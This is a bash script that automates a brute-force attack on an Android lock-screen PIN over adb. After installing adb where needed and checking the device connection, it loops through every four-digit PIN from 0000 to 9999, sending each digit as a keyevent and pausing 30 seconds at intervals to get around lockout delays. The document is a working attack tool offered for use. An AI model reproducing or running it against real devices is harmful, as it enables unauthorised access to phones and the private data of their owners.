#!/bin/bash
####
#### Copyright (C) 2019  wuseman <wuseman@nr1.nu> - All Rights Reserved
#### Created: 01-07-2018
####



adbexist() {
adb="$(which adb 2> /dev/null)"
distro="$(cat /etc/os-release | head -n 1 | cut -d'=' -f2 | sed 's/"//g')"

if [ -z "$adb" ]; then
 echo -e "\nThis tool require adb to be installed..\n"
  read -p "Install adb (Y/n) " adbinstall
fi

case $adbinstall in
     "Y")
        echo -e "\nPlease wait..\n"
      sleep 1
case $distro in
     "Gentoo")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        emerge --ask android-tools ;;
     "Sabayon")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        emerge --ask android-tools ;;
     "Ubuntu")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        apt update -y; apt upgrade -y; apt-get install adb ;;
     "Debian")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        apt update -y; apt upgrade -y; apt-get install adb ;;
     "Raspbian")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        apt update -y; apt upgrade -y; apt-get install adb ;;
     "Mint")
        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
        apt update -y; apt upgrade -y; apt-get install adb ;;
     "no") echo "Aborted." ;
           exit 0 ;;
esac
       echo -e "This tool is not supported for $distro, please go compile it from source instead...\n"
esac
}


connectedornot() {
isphoneconnected="$(adb devices | sed '1d' | sed '/^$/d')"
 if [ ! $isphoneconnected 2> /dev/null ]; then
      echo "* Your device is not connected properly.."
      exit
fi
}

android_gui_pin_attack() {
connectedornot
adbexist

screen="$(adb shell dumpsys nfc | grep 'mScreenState=')"
case $screen in
 "mScreenState=OFF") echo -e "Preparing to attack."; 
                     echo -e "All Has Been Set" ;;
 "mScreenState=ON_UNLOCKED") adb shell input keyevent 26
esac
   echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
   adb shell input keyevent 82
   adb shell input swipe 407 1211 378 85
for i in {0000..9999}; do
   echo -e "\e[0;1mTrying pin:  $i\e[0m"
for (( j=0; j<${#i}; j++ )); do
   adb shell input keyevent $((`echo ${i:$j:1}`+7))
done
   adb shell input keyevent 66
   adb shell input swipe 407 1211 378 85
clear() {
   adb shell input keyevent KEYCODE_MOVE_END
   adb shell input keyevent --longpress $(printf 'KEYCODE_DEL %.0s' {1..250}); } ;clear
if ! (( `expr $i + 1` % 4 )); then
   adb shell input keyevent 66
   sleep 30
   adb shell input keyevent 82
   adb shell input swipe 407 1211 378 85
fi
done
}
